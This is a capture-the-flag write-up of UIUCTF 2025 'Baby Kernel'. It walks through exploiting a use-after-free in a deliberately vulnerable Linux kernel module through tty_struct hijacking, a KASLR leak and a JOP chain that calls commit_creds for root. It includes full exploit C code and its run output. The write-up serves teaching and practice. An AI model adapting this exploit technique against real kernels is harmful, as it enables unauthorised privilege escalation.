---
title: 'UIUCTF 2025: "Baby Kernel"'
description: 'Utilizing a Use-After-Free and KJOP on the Kernel Heap to obtain root user privilege escalation'
date: '2025-08-04T09:00:51-04:00'
tags: ["binex", "writeups", "linux-kernel"]
author: "AmeliaYeah"
draft: false
table-of-contents: true
toc-auto-numbering: true
---

The "Baby Kernel" challenge in UIUCTF 2025 was very complex (atleast for me). However, even though it's still a novice challenge I wanted to share a more indepth walkthrough in hopes to make the elusive world of linux kernel exploitation more straightfoward.

Essentially, we're given this problem:

```bash
~$ ls -la /
total 44
drwxrwxr-x   14 root     root           400 Aug  4 14:46 .
drwxrwxr-x   14 root     root           400 Aug  4 14:46 ..
drwxr-xr-x    2 root     root          8160 Aug  4 13:43 bin
drwxr-xr-x    8 root     root          2300 Aug  4 14:45 dev
drwxr-xr-x    3 root     root           160 Aug  4 13:43 etc
-r--------    1 root     root            18 Aug  4 14:45 flag.txt
drwxr-xr-x    2 nobody   nobody          40 Sep 26  2024 home
-rwxr-xr-x    1 root     root           642 Aug  4 14:36 init
drwxr-xr-x    2 root     root           220 Aug  4 13:43 lib
lrwxrwxrwx    1 root     root             3 Sep 26  2024 lib64 -> lib
drwxrwxr-x    2 root     root          4096 Aug  4 14:45 mnt
dr-xr-xr-x  101 root     root             0 Aug  4 14:45 proc
drwx------    2 root     root            40 Sep 26  2024 root
dr-xr-xr-x   12 root     root             0 Aug  4 14:45 sys
drwxrwxrwt    2 root     root            40 Aug  4 14:45 tmp
drwxr-xr-x    4 root     root            80 Aug  4 13:43 usr
drwxr-xr-x    4 root     root            80 Aug  4 13:43 var
-rw-r--r--    1 root     root          8544 Jul 20 21:49 vuln.ko
~$ cat flag.txt
cat: flag.txt: Permission denied
```

The goal is to be able to read the `flag.txt` file (which is only readable by the root user) using exploitation of the linux kernel.

## Setup

### Kernel Version

From the challenge, we are given a `handout.tar.zst` file. Unzipping it gives us all the things we'll need: the QEMU run script, the filesystem `initrd.cpio.gz` archive, the compiled kernel, and a vulnerable kernel module they gave us.

First of all, before all else, it's important to know the version of the kernel which is running:

```bash
$ file bzImage 
bzImage: Linux kernel x86 boot executable, bzImage, version 6.6.16 ....
```

We can see that the kernel is version `6.6.16`. This will help us in later exploitation.

### Extracting vmlinux

In order to perform things like ROP on the kernel itself, we'll need to work with the `vmlinux` file itself, not the compressed `bzImage`. There's a tool to extract such thing for us already, so we can go ahead and run it:

```bash {script_name="extract_vmlinux.sh"}
git clone -b v6.6 https://github.com/torvalds/linux
./linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### Security protections

Let's take a look at the `run.sh` file which prepares `qemu`:

```bash {script_name="run.sh"}
#! /bin/sh

# Note: -serial mon:stdio is here for convenience purposes.
# Remotely the chal is run with -serial stdio.

qemu-system-x86_64 \
  -no-reboot \
  -cpu max \
  -net none \
  -serial mon:stdio \
  -display none \
  -monitor none \
  -vga none \
  -kernel bzImage \
  -initrd initrd.cpio.gz \
  -append "console=ttyS0"
```

It's important to note the `append` section. Since no specific flags like `nokaslr` have been set, it's obvious that normal kernel protections are in play here. Standard stuff like protections to seperate user and kernel space, `kaslr` to randomize kernel addresses, etc.

## The Vulnerable Kernel Module

As stated before, the challenge gave us a vulnerable kernel module, which will be what ultimately lets us pwn the kernel.

```c {script_name="vuln.c"}
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/ioctl.h>
#include <linux/uaccess.h>

#define K1_TYPE 0xB9

#define ALLOC _IOW(K1_TYPE, 0, size_t)
#define FREE _IO(K1_TYPE, 1)
#define USE_READ _IOR(K1_TYPE, 2, char)
#define USE_WRITE _IOW(K1_TYPE, 2, char)

long handle_ioctl(struct file *file, unsigned int cmd, unsigned long arg);

struct file_operations fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = handle_ioctl,
};

struct miscdevice vuln_dev ={
    .minor = MISC_DYNAMIC_MINOR,
    .name = "vuln",
    .fops = &fops, 
};

void* buf = NULL;
size_t size = 0;

long handle_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case ALLOC: {
            if (buf) {
                return -EFAULT;
            }
            ssize_t n =  copy_from_user(&size, (void*)arg, sizeof(size_t));
            if (n != 0) {
                return n;
            }
            buf = kzalloc(size, GFP_KERNEL);
            return 0;
        };
        case FREE: {
            if (!buf) {
                return -EFAULT;
            }
            kfree(buf);
            break;
        }
        case USE_READ: {
            if (!buf) {
                return -EFAULT;
            }
            return copy_to_user((char*)arg, buf, size);
        }

        case USE_WRITE: {
            if (!buf) {
                return -EFAULT;
            }
            return copy_from_user(buf, (char*)arg, size);
        }

        default: {
            break;
        }

    }
    return 0;
}

int32_t vuln_init(void) {
    int ret;
    
    ret = misc_register(&vuln_dev);
    if (ret) {
        printk(KERN_ERR "Failed to register device\n");
        return ret;
    }
    return 0;
}

void vuln_exit(void) {
    misc_deregister(&vuln_dev);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("UIUCTF Inc.");
MODULE_DESCRIPTION("Vulnerable Kernel Module");  
module_init(vuln_init);
module_exit(vuln_exit);
```

It's pretty much as follows:
1. Create a device at `/dev/vuln`
1. Listen on `ioctl`
    1. `ALLOC` instruction received? Allocate buffer with our size if not already allocated
    1. `FREE` instruction received? Free buffer if allocated **but forgets to mark the buffer as free** (UAF)
    1. `READ` instruction received? Read from buffer however many bytes we want to read, as long as it is LT or equal to the original size we allocated
    1. `WRITE` instruction received? Write to buffer however many bytes we want, again, as long as it is LT or equal to original allocated size

You probably saw it already, but yeah, the issue is the UAF vulnerability. This allows us to perform heap exploitation in the kernel, in a sense.

## tty_struct

Using [this post here](https://santaclz.github.io/2024/01/20/Linux-Kernel-Exploitation-Heap-techniques.html) as a reference, when it comes to the linux heap, especially on a non-modern version like this, we can essentially use our `UAF` to interface with what's known as a [tty_struct](https://elixir.bootlin.com/linux/v6.6.16/source/include/linux/tty.h#L193).

The `tty_struct` is essentially just a struct that gets allocated and placed onto the heap whenever we open a file descriptor to a tty instance, in our case using `/dev/ptmx` as per the article. We can make sure to allocate and free our buffer, then open the descriptor so our buffer points to a memory region occupied by a `tty_struct`.

We use a size of `0x400` (1024 bytes) as the `BUFFER_SIZE` to ensure the `tty_struct` properly allocates on the same address as our freed buffer.

```c
int main() {
	//open the vulnerable driver
	fd = open("/dev/vuln", O_RDWR);

	//allocate the buffer
	size_t buffer_size = BUFFER_SIZE;
	perform_ioctl(ALLOC, (size_t*)&buffer_size);

	//free it to get UAF
	perform_ioctl(FREE, NULL);

	//open ptmx
	tty = open("/dev/ptmx", O_RDONLY);

	//read
	perform_ioctl(USE_READ, (unsigned char*)&buf);
	pretty_print(buf, BUFFER_SIZE);
}
```

Executing this on the kernel, we get the result we're looking for: our zero'd out `kzalloc` buffer suddenly has tons of values in it:

```bash
~$ /mnt/exploit
success, returned 0
success, returned 0
success, returned 0
Printing: 01  ... 15 bytes ... c0 e3 99 41 16 db 39 ff  ... 1 bytes ... 90 bd 41 16 db 39 ff  ... 1 bytes ... 51 08 92 ff ff ff ff 90 b9 b8 41 16 db 39 ff  ... 16 bytes ... 40 ac c3 41 16 db 39 ff 40 ac c3 41 16 db 39 ff 50 ac c3 41 16 db 39 ff 50 ac c3 41 16 db 39 ff  ... 16 bytes ... 70 ac c3 41 16 db 39 ff 70 ac c3 41 16 db 39 ff  ... 16 bytes ... 90 ac c3 41 16 db 39 ff 90 ac c3 41 16 db 39 ff  ... 16 bytes ... b0 ac c3 41 16 db 39 ff b0 ac c3 41 16 db 39 ff  ... 24 bytes ... d8 ac c3 41 16 db 39 ff d8 ac c3 41 16 db 39 ff  ... 16 bytes ... f8 ac c3 41 16 db 39 ff f8 ac c3 41 16 db 39 ff  ... 8 bytes ... bf  ... 8 bytes ... 03 1c 7f 15 04  ... 1 bytes ... 01  ... 1 bytes ... 11 13 1a  ... 1 bytes ... 12 0f 17 16  ... 4 bytes ... 96  ... 3 bytes ... 96  ... 46 bytes ... 70 74 6d 30  ... 60 bytes ... 01 08 01  ... 5 bytes ... 01  ... 56 bytes ... b0 c3 41 16 db 39 ff  ... 16 bytes ... f8 ad c3 41 16 db 39 ff f8 ad c3 41 16 db 39 ff  ... 8 bytes ... 10 ae c3 41 16 db 39 ff 10 ae c3 41 16 db 39 ff e0 ff ff ff 0f  ... 3 bytes ... 28 ae c3 41 16 db 39 ff 28 ae c3 41 16 db 39 ff  ... 1 bytes ... 96 40 91 ff ff ff ff  ... 1 bytes ... d0 18 80 6f 07 55 ff c0 8b be 41 16 db 39 ff  ... 16 bytes ... 90 59 05 41 16 db 39 ff 90 59 05 41 16 db 39 ff e0 ff ff ff 0f  ... 3 bytes ... 78 ae c3 41 16 db 39 ff 78 ae c3 41 16 db 39 ff e0 b3 40 91 ff ff ff ff  ..
```

### Obtaining a kaslr bypass

Knowing that this is a `tty_struct`, it's also important to note that some values (particularly the `*ops` field) contain pointers. This means that, since we are able to read kernel memory, we can use a field to act as a leak, and thus bypass `kaslr` by calculating the base kernel address from such leak.

In particular, at `buf+32`, a pointer to [ptm_unix98_ops](https://elixir.bootlin.com/linux/v6.6.16/source/drivers/tty/pty.c#L745) (`0xffffffff92085100`) is present. This is very important not only because we're able to obtain a kernel leak, but also because we're going to be modifying this field later on for code execution.

The start of the kernel is at `startup_64`.

```bash
~# cat /proc/kallsyms | grep -i startup_64
ffffffff90e00000 T startup_64
```

Performing `0xffffffff92085100 - 0xffffffff90e00000` gives us `0x1285100`, meaning that to obtain the base address for the kernel, we subtract this leak by that value.

### Obtaining a heap address

So that's all good, but we can also go a bit further. Knowing that, in this run, the buffer is located at kernel address `0xff36b934c1c32c00`, we can see the following addresses in the buffer:

```bash
... 40 2c c3 c1 34 b9 36 ff ...
... 50 2c c3 c1 34 b9 36 ff ...
... 70 2c c3 c1 34 b9 36 ff ...
.....
```

Essentially, we get a bunch of leaks near to the address of the actual buffer. In my case, I will be using `buf+64` (the first address seen here). Since it's at an offset of `buffer_address+0x40`, we can simply subtract `0x40` from this address in order to get a leak.

## tty_operations and code execution

So, yay! We got a heap leak and a kernel leak. What benefit does that give us?

Well...two things.

The heap leak gives us one thing, but something very important. Once again, the main point of interest for getting code execution would be the \*ops field in the `tty_struct` we have access to. It is essentially a pointer to a [tty_operations](https://elixir.bootlin.com/linux/v6.6.16/source/include/linux/tty_driver.h#L350) struct, which is a vtable (again, very similar to libc filestream vtables) containing a bunch of different functions.

If we can make a fake `tty_operations` struct, which is actually just somewhere else in the `tty_struct` in our kernelspace buffer (hence the need for the heap leak), then we can essentially have *some* code execution.

The kernel leak allows us to essentially access any address in the kernel, which is what will actually allow us to have code execution.

There's multiple ways to victory here. [This writeup](https://razvan.sh/writeups/baby-kernel-uiuctf/) used the `modprobe_path` overwrite approach (something I was considering but ultimately had difficulty with). My goal however was to get the golden function `commit_creds` executed with root credentials.

### Developing the vtable

So, in terms of the fake `tty_operations` struct, I decided to use the latter end of the buffer, meaning our fake struct will be located at `buf+0x300` out of the `0x400` we have access to.

I then decided to focus on `ioctl` for the `/dev/ptmx` file descriptor that the `tty_struct` actually belongs to. This is mainly because it gives us simple control over the `ecx` and `rdx` registers right off the bat.

So, essentially, the idea to get some function A to execute whenever we call `ioctl(ptmx_fd, ecx, rdx)` is here:

```c
unsigned char userland_buffer[0x400];

//get UAF
allocate_buffer();
free_buffer();

//get ptmx with the tty_struct now on the same heap address as kernel buffer
int ptmx_fd = open("/dev/ptmx", O_RDONLY);

//read from kernel to our userland buffer in order to get leak of kmem
read_from_kernel(userland_buffer);
get_kernel_and_heap_leaks();

//modify the tty_struct's *op field to the location of our fake tty_operations struct on the kernel
uint64_t* tty_ops_ptr = (uint64_t*)(buf+32);
*tty_ops_ptr = kernel_buff_address+FAKE_VTABLE_OFFSET;

//write to our fake tty_operations struct
uint64_t* tty_operations_struct = (uint64_t*)(userland_buffer+FAKE_VTABLE_OFFSET);
tty_operations_struct[12] = FUNCTION_A;

//write to kernelspace
perform_ioctl(USE_WRITE, userland_buffer);

//execute FUNCTION_A
ioctl(ptmx_fd, ecx, rdx);
```

Sounds great right? Except, the big issue is that the real register we want control over is `RDI`, AKA the first parameter. But take a look at how `ioctl` (and all other functions in `tty_operations`) works:

```c
int  (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
```

No matter what, every single `tty_operations` function sets `RDI` (the first parameter) to the address of the `tty_struct`. So, if we want to execute `commit_creds` or any other kernel function, we'll be executing `commit_creds(tty_struct)` which doesn't make any sense.

If we want to get root, all that's left is to somehow have some function B that does the following:

```c
void b(target_rdi) {
    rdi = target_rdi;
    a();
}
```

### JOP

This sort of thing is where *Jump-Oriented Programming* comes in, using the kernel leak for gadgets. We aren't able to use *Return-Oriented Programming* because, if we do that, then obviously we forgo all the progress we made in setting `RDI` (since we'll have to re-call `ioctl`, which thus, refucks `RDI` again).

**Important note**: Unlike normal searching for ROP/JOP/COP gadgets, not all of the `vmlinux` address space is available to use. The kernel sometimes, usually, blocks off alot of gadgets by setting their pages to `NX` (thus making them brick the kernel upon attempted execution).

In order to locate valid gadgets, we'll need to search for them in the address space that is actually executable. We'll then need to subtract the addresses of all gadgets by `0xffffffff81000000` in order to get the offset relevant to the base address of the kernel.

```bash
$ ROPgadget --binary ./vmlinux --all --range 0xffffffff81000000-0xffffffff82200000 > gadgets
```

In short, here's the gadgets that we'll be using (in their order):

```as
0xffffffff8132e788 : add cl, byte ptr [rax - 0x75] ; push rdi ; adc cl, ch ; pop rsi ; sar bh, cl ; jmp qword ptr [rsi + 0x2e]
0xffffffff81d4b591 : push rdx ; jmp qword ptr [rsi + 0x66]
0xffffffff8191d2bd : pop rdi ; inc al ; jmp qword ptr [rsi + 0x41]
```

Here's how it works:
1. Knowing `ioctl` controls `rdx`, we have `rdx` control
1. We modify `ioctl` in the `tty_operations` struct to the first gadget, which will:
    1. Push the value of `rdi` to the stack (where `rdi` is the address of the `tty_struct`)
    1. Pop off the stack into `rsi` (aka, set `rsi=rdi=tty_struct_addr`)
    1. Jump to `tty_struct_addr+0x2e`, which beforehand will be set to the next gadget
1. At `tty_struct_addr+0x2e`, the second gadget will:
    1. Push the value of `rdx` onto the stack
    1. Jump to `tty_struct_addr+0x66`
1. At `tty_struct_addr+0x66`, the third and final gadget will:
    1. Pop off the stack into `rdi` (aka, set `rdi=rdx`, thus meaning we have `rdi` control)
    1. Jump to `tty_struct_addr+0x41`
1. Now that `rdi` has been set to a value we want, `tty_struct_addr+0x41` will contain the address of the function we want executed.

So, what this means now is that we essentially have the ability to execute `A(rdi)`, and so, in our case, we can execute `commit_creds(something)`.

Now, normally you would execute `commit_creds(prepare_kernel_creds(NULL))`, however, in order to ease the difficulty for us (as having `prepare_kernel_creds` execute and then grabbing its value would be difficult), we can instead use [init_cred](https://elixir.bootlin.com/linux/v6.6.16/source/kernel/cred.c#L44). `init_cred` essentially is just credentials already set to root, initialized by the kernel. This means we can make it much easier on ourselves by basically just using this *jop* formula once, with `rdi=&init_cred`.

## The Finale

With all that set, once `commit_cred` executes it will modify our process privileges for us. We can then go ahead and finish our exploit by calling `system("/bin/sh")` in order to get an elevated shell.

(Closing the program will also crash the kernel because of `/dev/ptmx` shutting down with it. To fix this you will need to do some extra work to ensure the fake `tty_operations` has stuff like `close` set to its proper values, but I didn't really care about that once I got the flag so)

```c {script_name="exploit.c"}
#include <sys/ioctl.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <stdint.h>
#include <linux/prctl.h>
#include <sys/prctl.h>

#define K1_TYPE 0xB9

#define ALLOC _IOW(K1_TYPE, 0, size_t)
#define FREE _IO(K1_TYPE, 1)
#define USE_READ _IOR(K1_TYPE, 2, char)
#define USE_WRITE _IOW(K1_TYPE, 2, char)

#define BUFFER_SIZE 0x400

#define FAKE_VTABLE_OFFSET 0x300

int fd = 0;
void perform_ioctl(unsigned int cmd, void* args) {
    long res = ioctl(fd, cmd, args);
    printf("%s, returned %d\n", (res==0)?"success":"failure", res);

    if(res != 0) {
        exit(1);
    }
}

int tty = 0;
unsigned char buf[BUFFER_SIZE];
uint64_t* vtable;
uint64_t raw_execute(uint64_t func, uint64_t rcx, uint64_t rdx) {
    //set our function
    vtable[12] = func;
    perform_ioctl(USE_WRITE, (unsigned char*)&buf);

    //execute
    uint64_t res = ioctl(tty, rcx, rdx);
    if(res != -1) {
        return res;
    }

    return 0;
}

//execute functions with rdi control thanks to jop
uint64_t kernel_base = 0;
uint64_t buff_address = 0;
uint64_t execute(uint64_t rdi, uint64_t target_func) {
    uint64_t push_rdi_pop_rsi_jmp_rsi_plus_0x2e = kernel_base+0x32e788;
    uint64_t push_rdx_jmp_0x66 = kernel_base+0xd4b591;
    uint64_t pop_rdi_jmp_0x41 = kernel_base+0x91d2bd;

    //1st stage
    //  write rdx, the raw value, to the stack
    *(uint64_t*)(buf + 0x2e) = push_rdx_jmp_0x66;

    //2nd stage
    //  pop rdx into rdi
    *(uint64_t*)(buf + 0x66) = pop_rdi_jmp_0x41;

    //final stage
    //  execute the function
    *(uint64_t*)(buf + 0x41) = target_func;

    printf("Executing; starting %p ending %p\n", push_rdi_pop_rsi_jmp_rsi_plus_0x2e, target_func);

    //0th stage
    //  RSI = RDI (buff addr)
    //  jump to (buff addr + 0x2e)
    return raw_execute(push_rdi_pop_rsi_jmp_rsi_plus_0x2e, 0, rdi);
}

void pretty_print(unsigned char* buf, size_t size) {
    printf("Printing: ");

    int ctr = -1;
    for(int i = 0; i < size; i++) {
        if(buf[i] == 0) {
            if(ctr == -1) {
                ctr = 0;
                printf(" ... ");
            }
            ctr += 1;
            continue;
        }else{
            if(ctr != -1) {
                printf("%d bytes ... ", ctr);
                ctr = -1;
            }
        }

        printf("%02x ", buf[i]);
    }
    printf("\n");
}

int main() {
    //open the vulnerable driver
    fd = open("/dev/vuln", O_RDWR);

    //allocate the buffer
    size_t buffer_size = BUFFER_SIZE;
    perform_ioctl(ALLOC, (size_t*)&buffer_size);

    //free it to get UAF
    perform_ioctl(FREE, NULL);

    //open ptmx
    tty = open("/dev/ptmx", O_RDONLY);

    //read
    perform_ioctl(USE_READ, (unsigned char*)&buf);
    pretty_print(buf, BUFFER_SIZE);

    //use leak from ptm_unix98_ops to get kernel base address
    uint64_t* tty_ops = (uint64_t*)(buf+32);
    kernel_base = *tty_ops - 0x1285100;
    printf("Kernel base address: %p\n", kernel_base);

    //use the heap leak in tty_struct to get location of buffer
    //  (or, location of tty_struct)
    uint64_t heap_leak = *(uint64_t*)(buf+64);
    buff_address = heap_leak-0x40;
    printf("Address of allocated buffer: %p\n", buff_address);

    //set tty_ops to point to the portion of the kernel buffer
    //  with our fake vtable
    *tty_ops = (uint64_t)(buff_address+FAKE_VTABLE_OFFSET);

    //modify the userland buffer here so we can change ioctl
    //  to a function we want
    vtable = (uint64_t*)(buf+FAKE_VTABLE_OFFSET);

    //commit_creds function
    uint64_t commit_creds = kernel_base+0xb9970;
    uint64_t prepare_kernel_cred = kernel_base+0xb9c20;
    uint64_t init_cred = kernel_base+0x1a52fc0;

    //commit init_cred
    execute(init_cred, commit_creds);

    //start system process; closing the ptys by terminating
    //  the program will crash the kernel
    system("/bin/sh");
}
```

```python {script_name="transfer_to_server_lol.py"}
from pwn import *
from base64 import b64encode
from tqdm import tqdm

with process("ncat --ssl baby-kernel.chal.uiuc.tf 1337".split(" "), stdin=PTY) as p:
    data = b64encode(open("./shared/exploit", "rb").read()).decode("ascii")
    for i in tqdm(range(0, len(data), 100)):
        chars = data[i:i+100]
        p.sendlineafter(b"$ ", f"echo -n '{chars}' >> /tmp/exploit_b64".encode("ascii"))

        p.sendlineafter(b"$ ", b"cat /tmp/exploit_b64 | base64 -d > /tmp/exploit")
        p.sendlineafter(b"$ ", b"md5sum /tmp/exploit")
    p.sendlineafter(b"$ ", b"chmod +x /tmp/exploit")
    p.interactive()
```

```bash
~$ /mnt/exploit 
success, returned 0
success, returned 0
success, returned 0
Printing: 01  ... 15 bytes ... c0 63 99 41 04 4f 3b ff  ... 2 bytes ... c0 41 04 4f 3b ff  ... 1 bytes ... 51 e8 b8 ff ff ff ff 90 39 b9 41 04 4f 3b ff  ... 16 bytes ... 40 ec c2 41 04 4f 3b ff 40 ec c2 41 04 4f 3b ff 50 ec c2 41 04 4f 3b ff 50 ec c2 41 04 4f 3b ff  ... 16 bytes ... 70 ec c2 41 04 4f 3b ff 70 ec c2 41 04 4f 3b ff  ... 16 bytes ... 90 ec c2 41 04 4f 3b ff 90 ec c2 41 04 4f 3b ff  ... 16 bytes ... b0 ec c2 41 04 4f 3b ff b0 ec c2 41 04 4f 3b ff  ... 24 bytes ... d8 ec c2 41 04 4f 3b ff d8 ec c2 41 04 4f 3b ff  ... 16 bytes ... f8 ec c2 41 04 4f 3b ff f8 ec c2 41 04 4f 3b ff  ... 8 bytes ... bf  ... 8 bytes ... 03 1c 7f 15 04  ... 1 bytes ... 01  ... 1 bytes ... 11 13 1a  ... 1 bytes ... 12 0f 17 16  ... 4 bytes ... 96  ... 3 bytes ... 96  ... 46 bytes ... 70 74 6d 30  ... 60 bytes ... 01 08 01  ... 5 bytes ... 01  ... 56 bytes ... f0 c2 41 04 4f 3b ff  ... 16 bytes ... f8 ed c2 41 04 4f 3b ff f8 ed c2 41 04 4f 3b ff  ... 8 bytes ... 10 ee c2 41 04 4f 3b ff 10 ee c2 41 04 4f 3b ff e0 ff ff ff 0f  ... 3 bytes ... 28 ee c2 41 04 4f 3b ff 28 ee c2 41 04 4f 3b ff  ... 1 bytes ... 96 20 b8 ff ff ff ff  ... 1 bytes ... d0 18 40 6d 0f 4d ff  ... 1 bytes ... 98 be 41 04 4f 3b ff  ... 16 bytes ... 10 75 bb 41 04 4f 3b ff 10 75 bb 41 04 4f 3b ff e0 ff ff ff 0f  ... 3 bytes ... 78 ee c2 41 04 4f 3b ff 78 ee c2 41 04 4f 3b ff e0 b3 20 b8 ff ff ff ff  ... 
Kernel base address: 0xffffffffb7c00000
Address of allocated buffer: 0xff3b4f0441c2ec00
Executing; starting 0xffffffffb7f2e788 ending 0xffffffffb7cb9970
success, returned 0
~# cat /flag.txt
uiuctf{use_after_free_ecda3a86}
```
